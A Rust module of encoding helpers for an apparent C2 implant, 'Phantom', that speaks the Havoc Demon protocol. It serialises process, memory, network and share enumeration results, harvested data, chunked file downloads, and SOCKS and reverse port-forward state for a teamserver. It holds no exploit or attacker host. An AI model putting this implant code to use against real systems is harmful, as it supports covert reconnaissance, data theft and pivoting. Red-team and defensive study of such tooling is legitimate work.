//! Demon wire-format encoding helpers.

use std::fs;
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};

use red_cell_common::demon::{
    DemonCallback, DemonFilesystemCommand, DemonNetCommand, DemonProcessCommand,
    DemonSocketCommand, DemonSocketType, DemonTransferCommand,
};
use time::OffsetDateTime;

use crate::error::PhantomError;

use super::harvest::HarvestEntry;
use super::io_error;
use super::types::{
    ActiveDownload, FilesystemEntry, FilesystemListing, GroupEntry, MemoryRegion, ModifiedTime,
    ProcessEntry, SessionEntry, ShareEntry, UserEntry,
};

/// Encode a list of harvest entries into the wire payload.
///
/// Format: `count(u32 LE) [ kind(len-prefixed UTF-8) path(len-prefixed UTF-8) data(len-prefixed bytes) … ]`
pub(crate) fn encode_harvest_entries(entries: &[HarvestEntry]) -> Result<Vec<u8>, PhantomError> {
    let count = u32::try_from(entries.len())
        .map_err(|_| PhantomError::InvalidResponse("harvest entry count overflow"))?;
    let mut payload = encode_u32(count);
    for entry in entries {
        payload.extend_from_slice(&encode_bytes(entry.kind.as_bytes())?);
        payload.extend_from_slice(&encode_bytes(entry.path.as_bytes())?);
        payload.extend_from_slice(&encode_bytes(&entry.data)?);
    }
    Ok(payload)
}

/// Encode bytes into the little-endian length-prefixed format (like `encode_bytes`
/// but infallible for pivot use where the caller already holds valid data).
pub(crate) fn encode_bytes_result(value: &[u8]) -> Vec<u8> {
    let len = value.len() as u32;
    let mut out = Vec::with_capacity(4 + value.len());
    out.extend_from_slice(&len.to_le_bytes());
    out.extend_from_slice(value);
    out
}

pub(crate) fn encode_process_list(
    process_ui: u32,
    processes: &[ProcessEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(process_ui);
    for process in processes {
        payload.extend_from_slice(&encode_utf16(&process.name)?);
        payload.extend_from_slice(&encode_u32(process.pid));
        payload.extend_from_slice(&encode_bool(process.is_wow64));
        payload.extend_from_slice(&encode_u32(process.parent_pid));
        payload.extend_from_slice(&encode_u32(process.session));
        payload.extend_from_slice(&encode_u32(process.threads));
        payload.extend_from_slice(&encode_utf16(&process.user)?);
    }
    Ok(payload)
}

pub(crate) fn encode_proc_create(
    path: &str,
    pid: u32,
    success: bool,
    piped: bool,
    verbose: bool,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Create));
    payload.extend_from_slice(&encode_utf16(path)?);
    payload.extend_from_slice(&encode_u32(pid));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_bool(piped));
    payload.extend_from_slice(&encode_bool(verbose));
    Ok(payload)
}

pub(crate) fn encode_proc_kill(success: bool, pid: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Kill));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(pid));
    payload
}

pub(crate) fn encode_proc_grep(processes: &[ProcessEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Grep));
    for process in processes {
        payload.extend_from_slice(&encode_utf16(&process.name)?);
        payload.extend_from_slice(&encode_u32(process.pid));
        payload.extend_from_slice(&encode_u32(process.parent_pid));
        payload.extend_from_slice(&encode_utf16(&process.user)?);
        payload.extend_from_slice(&encode_u32(if process.is_wow64 { 86 } else { 64 }));
    }
    Ok(payload)
}

pub(crate) fn encode_proc_modules(
    pid: u32,
    modules: &[(String, u64)],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Modules));
    payload.extend_from_slice(&encode_u32(pid));
    for (name, base) in modules {
        payload.extend_from_slice(&encode_bytes(name.as_bytes())?);
        payload.extend_from_slice(&encode_u64(*base));
    }
    Ok(payload)
}

pub(crate) fn encode_proc_memory(
    pid: u32,
    query_protection: u32,
    regions: &[MemoryRegion],
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Memory));
    payload.extend_from_slice(&encode_u32(pid));
    payload.extend_from_slice(&encode_u32(query_protection));
    for region in regions {
        payload.extend_from_slice(&encode_u64(region.base));
        payload.extend_from_slice(&encode_u32(region.size));
        payload.extend_from_slice(&encode_u32(region.protect));
        payload.extend_from_slice(&encode_u32(region.state));
        payload.extend_from_slice(&encode_u32(region.mem_type));
    }
    payload
}

pub(crate) fn encode_net_domain(domain: &str) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Domain));
    payload.extend_from_slice(&encode_bytes(domain.as_bytes())?);
    Ok(payload)
}

pub(crate) fn encode_net_name_list(
    subcommand: DemonNetCommand,
    target: &str,
    names: &[String],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(target)?);
    for name in names {
        payload.extend_from_slice(&encode_utf16(name)?);
    }
    Ok(payload)
}

pub(crate) fn encode_net_logons(target: &str, users: &[String]) -> Result<Vec<u8>, PhantomError> {
    encode_net_name_list(DemonNetCommand::Logons, target, users)
}

pub(crate) fn encode_net_sessions(
    target: &str,
    sessions: &[SessionEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Sessions));
    payload.extend_from_slice(&encode_utf16(target)?);
    for session in sessions {
        payload.extend_from_slice(&encode_utf16(&session.client)?);
        payload.extend_from_slice(&encode_utf16(&session.user)?);
        payload.extend_from_slice(&encode_u32(session.active));
        payload.extend_from_slice(&encode_u32(session.idle));
    }
    Ok(payload)
}

pub(crate) fn encode_net_shares(
    target: &str,
    shares: &[ShareEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Share));
    payload.extend_from_slice(&encode_utf16(target)?);
    for share in shares {
        payload.extend_from_slice(&encode_utf16(&share.name)?);
        payload.extend_from_slice(&encode_utf16(&share.path)?);
        payload.extend_from_slice(&encode_utf16(&share.remark)?);
        payload.extend_from_slice(&encode_u32(share.access));
    }
    Ok(payload)
}

pub(crate) fn encode_net_groups(
    subcommand: DemonNetCommand,
    target: &str,
    groups: &[GroupEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(target)?);
    for group in groups {
        payload.extend_from_slice(&encode_utf16(&group.name)?);
        payload.extend_from_slice(&encode_utf16(&group.description)?);
    }
    Ok(payload)
}

pub(crate) fn encode_net_users(target: &str, users: &[UserEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Users));
    payload.extend_from_slice(&encode_utf16(target)?);
    for user in users {
        payload.extend_from_slice(&encode_utf16(&user.name)?);
        payload.extend_from_slice(&encode_bool(user.is_admin));
    }
    Ok(payload)
}

pub(crate) fn encode_fs_dir_listing(
    target: &Path,
    subdirs: bool,
    files_only: bool,
    dirs_only: bool,
    list_only: bool,
) -> Result<Vec<u8>, PhantomError> {
    let start_path = directory_root_path(target);
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Dir));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_bool(list_only));
    payload.extend_from_slice(&encode_utf16(&start_path)?);

    let listings = collect_directory_listings(target, subdirs, files_only, dirs_only)?;
    payload.extend_from_slice(&encode_bool(true));
    for listing in listings {
        let files = listing.entries.iter().filter(|entry| !entry.is_dir).count() as u32;
        let dirs = listing.entries.iter().filter(|entry| entry.is_dir).count() as u32;
        let total_size = listing
            .entries
            .iter()
            .filter(|entry| !entry.is_dir)
            .map(|entry| entry.size)
            .sum::<u64>();

        payload.extend_from_slice(&encode_utf16(&listing.root_path)?);
        payload.extend_from_slice(&encode_u32(files));
        payload.extend_from_slice(&encode_u32(dirs));
        if !list_only {
            payload.extend_from_slice(&encode_u64(total_size));
        }

        for entry in listing.entries {
            payload.extend_from_slice(&encode_utf16(&entry.name)?);
            if !list_only {
                payload.extend_from_slice(&encode_bool(entry.is_dir));
                payload.extend_from_slice(&encode_u64(entry.size));
                payload.extend_from_slice(&encode_u32(entry.modified.day));
                payload.extend_from_slice(&encode_u32(entry.modified.month));
                payload.extend_from_slice(&encode_u32(entry.modified.year));
                payload.extend_from_slice(&encode_u32(entry.modified.minute));
                payload.extend_from_slice(&encode_u32(entry.modified.hour));
            }
        }
    }

    Ok(payload)
}

pub(crate) fn collect_directory_listings(
    target: &Path,
    subdirs: bool,
    files_only: bool,
    dirs_only: bool,
) -> Result<Vec<FilesystemListing>, PhantomError> {
    let mut listings = Vec::new();
    let mut pending = vec![target.to_path_buf()];
    while let Some(root) = pending.pop() {
        let mut entries = Vec::new();
        let read_dir = match fs::read_dir(&root) {
            Ok(read_dir) => read_dir,
            // Directory vanished between being queued and being read (TOCTOU).
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
            Err(error) => return Err(io_error(&root, error)),
        };
        for entry in read_dir {
            let entry = match entry {
                Ok(entry) => entry,
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                Err(error) => return Err(io_error(&root, error)),
            };
            let path = entry.path();
            let metadata = match entry.metadata() {
                Ok(metadata) => metadata,
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                Err(error) => return Err(io_error(&path, error)),
            };
            if metadata.is_dir() && subdirs {
                pending.push(path.clone());
            }
            if files_only && metadata.is_dir() {
                continue;
            }
            if dirs_only && metadata.is_file() {
                continue;
            }
            entries.push(FilesystemEntry {
                name: entry.file_name().to_string_lossy().into_owned(),
                is_dir: metadata.is_dir(),
                size: metadata.len(),
                modified: modified_time(metadata.modified().ok()),
            });
        }
        entries.sort_by(|left, right| left.name.cmp(&right.name));
        listings.push(FilesystemListing { root_path: directory_root_path(&root), entries });
    }
    listings.sort_by(|left, right| left.root_path.cmp(&right.root_path));
    Ok(listings)
}

pub(crate) fn modified_time(timestamp: Option<SystemTime>) -> ModifiedTime {
    let unix_timestamp = timestamp
        .and_then(|time| time.duration_since(UNIX_EPOCH).ok())
        .map(|duration| duration.as_secs() as i64)
        .unwrap_or_default();
    let datetime =
        OffsetDateTime::from_unix_timestamp(unix_timestamp).unwrap_or(OffsetDateTime::UNIX_EPOCH);
    ModifiedTime {
        day: datetime.day().into(),
        month: u8::from(datetime.month()).into(),
        year: u32::try_from(datetime.year()).unwrap_or_default(),
        minute: datetime.minute().into(),
        hour: datetime.hour().into(),
    }
}

pub(crate) fn directory_root_path(path: &Path) -> String {
    let display = path.display().to_string();
    if display.ends_with('/') { display } else { format!("{display}/") }
}

pub(crate) fn encode_fs_cat(path: &Path, contents: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Cat));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(contents)?);
    Ok(payload)
}

pub(crate) fn encode_fs_path_only(
    subcommand: DemonFilesystemCommand,
    path: &Path,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    Ok(payload)
}

pub(crate) fn encode_fs_remove(path: &Path, is_dir: bool) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Remove));
    payload.extend_from_slice(&encode_bool(is_dir));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    Ok(payload)
}

pub(crate) fn encode_fs_copy_move(
    subcommand: DemonFilesystemCommand,
    success: bool,
    from: &Path,
    to: &Path,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_utf16(&from.display().to_string())?);
    payload.extend_from_slice(&encode_utf16(&to.display().to_string())?);
    Ok(payload)
}

pub(crate) fn encode_u32(value: u32) -> Vec<u8> {
    value.to_le_bytes().to_vec()
}

pub(crate) fn encode_u64(value: u64) -> Vec<u8> {
    value.to_le_bytes().to_vec()
}

pub(crate) fn encode_bool(value: bool) -> Vec<u8> {
    encode_u32(u32::from(value))
}

pub(crate) fn encode_bytes(value: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let len = u32::try_from(value.len())
        .map_err(|_| PhantomError::InvalidResponse("socket payload too large"))?;
    let mut out = Vec::with_capacity(4 + value.len());
    out.extend_from_slice(&len.to_le_bytes());
    out.extend_from_slice(value);
    Ok(out)
}

pub(crate) fn encode_utf16(value: &str) -> Result<Vec<u8>, PhantomError> {
    let encoded = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
    encode_bytes(&encoded)
}

pub(crate) fn encode_port_forward_add(
    command: DemonSocketCommand,
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(command));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

pub(crate) fn encode_socket_open(
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Open));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

pub(crate) fn encode_socket_read_success(
    socket_id: u32,
    socket_type: DemonSocketType,
    data: &[u8],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(data)?);
    Ok(payload)
}

pub(crate) fn encode_socket_read_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

pub(crate) fn encode_socket_write_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Write));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

pub(crate) fn encode_socket_close(socket_id: u32, socket_type: DemonSocketType) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Close));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload
}

pub(crate) fn encode_socket_connect(success: bool, socket_id: u32, error_code: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Connect));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

pub(crate) fn encode_socks_proxy_add(
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyAdd));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload
}

pub(crate) fn encode_socks_proxy_remove(socket_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload
}

pub(crate) fn encode_rportfwd_remove(
    socket_id: u32,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

pub(crate) fn encode_socket_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

pub(crate) fn encode_socks_proxy_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

/// Encode a `DemonCallback::File` (file-open) payload for `BeaconOutput`.
///
/// Length-prefixed fields (`callback_type`, `inner_len`) use Demon little-endian conventions.
///
/// The inner blob uses **big-endian** `file_id` and declared size (`u32`), then UTF‑8 path — matching
/// Havoc Demon wire format and the teamserver BeaconOutput parser (`parse_file_open_header`).
///
/// Wire format: `[callback_type:u32 LE][len:u32 LE][file_id:u32 BE][file_size:u32 BE][path:UTF-8]`
pub(crate) fn encode_file_open(
    file_id: u32,
    file_size: u64,
    file_path: &str,
) -> Result<Vec<u8>, PhantomError> {
    let truncated_size = u32::try_from(file_size.min(u64::from(u32::MAX)))
        .map_err(|_| PhantomError::InvalidResponse("file size overflow"))?;
    let inner_len = 4 + 4 + file_path.len();
    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::File)));
    payload.extend_from_slice(&encode_u32(
        u32::try_from(inner_len)
            .map_err(|_| PhantomError::InvalidResponse("file open inner too large"))?,
    ));
    payload.extend_from_slice(&file_id.to_be_bytes());
    payload.extend_from_slice(&truncated_size.to_be_bytes());
    payload.extend_from_slice(file_path.as_bytes());
    Ok(payload)
}

/// Encode a `DemonCallback::FileWrite` (chunk) payload for `BeaconOutput`.
///
/// Inner blob begins with **`file_id` in big-endian** — matches teamserver `parse_file_chunk`.
///
/// Wire format: `[callback_type:u32 LE][len:u32 LE][file_id:u32 BE][chunk_data]`
pub(crate) fn encode_file_chunk(file_id: u32, data: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let inner_len = 4 + data.len();
    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileWrite)));
    payload.extend_from_slice(&encode_u32(
        u32::try_from(inner_len)
            .map_err(|_| PhantomError::InvalidResponse("file chunk inner too large"))?,
    ));
    payload.extend_from_slice(&file_id.to_be_bytes());
    payload.extend_from_slice(data);
    Ok(payload)
}

/// Encode a `DemonCallback::FileClose` payload for `BeaconOutput`.
///
/// Inner blob is **big-endian** `file_id` — matches teamserver `parse_file_close`.
///
/// Wire format: `[callback_type:u32 LE][len:u32 LE][file_id:u32 BE]`
pub(crate) fn encode_file_close(file_id: u32) -> Result<Vec<u8>, PhantomError> {
    let mut payload = Vec::with_capacity(12);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileClose)));
    payload.extend_from_slice(&encode_u32(4));
    payload.extend_from_slice(&file_id.to_be_bytes());
    Ok(payload)
}

/// Encode a `CommandTransfer` response payload.
pub(crate) fn encode_transfer_list(downloads: &[ActiveDownload]) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonTransferCommand::List));
    for download in downloads {
        payload.extend_from_slice(&encode_u32(download.file_id));
        let read_size = u32::try_from(download.read_size).unwrap_or(u32::MAX);
        payload.extend_from_slice(&encode_u32(read_size));
        payload.extend_from_slice(&encode_u32(download.state as u32));
    }
    payload
}

/// Encode a transfer stop/resume/remove response payload.
pub(crate) fn encode_transfer_action(
    subcommand: DemonTransferCommand,
    found: bool,
    file_id: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_bool(found));
    payload.extend_from_slice(&encode_u32(file_id));
    payload
}

/// Encode the secondary close callback sent after a transfer remove, matching Demon behaviour.
///
/// Wire format: `[subcommand:u32][file_id:u32][reason:u32]`
/// Reason 1 = `DOWNLOAD_REASON_REMOVED`.
pub(crate) fn encode_transfer_remove_close(file_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonTransferCommand::Remove));
    payload.extend_from_slice(&encode_u32(file_id));
    payload.extend_from_slice(&encode_u32(1)); // DOWNLOAD_REASON_REMOVED
    payload
}
